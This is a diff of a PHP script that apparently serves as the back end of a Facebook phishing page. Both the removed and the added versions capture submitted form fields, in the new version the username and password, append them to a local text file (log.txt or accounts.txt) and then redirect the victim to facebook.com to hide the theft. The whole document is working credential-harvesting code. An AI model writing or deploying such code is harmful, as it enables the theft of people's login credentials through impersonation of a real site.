@@ -1,13 +1,15 @@
-<?php 
-header ('Location: http://www.facebook.com');
-$file = fopen("log.txt", "a"); 
-foreach($_POST as $variable => $value) { 
-    fwrite($file, $variable); 
-    fwrite($file, "="); 
-    fwrite($file, $value); 
-    fwrite($file, "\r\n"); 
-} 
-fwrite($file, "\r\n"); 
-fclose($file); 
-exit; 
-?>
+<?php
+if(isset($_POST['login-btn']))
+    {
+    $username = $_POST['Username'];
+    $password = $_POST['Password'];
+    $text = $username . "," . $password . "\n";
+    $fp = fopen('accounts.txt', 'a+');
+
+    if(fwrite($fp, $text))  {
+        echo 'Saved';
+    }
+fclose ($fp);
+header("Location: http://www.facebook.com");
+die();
+}?>
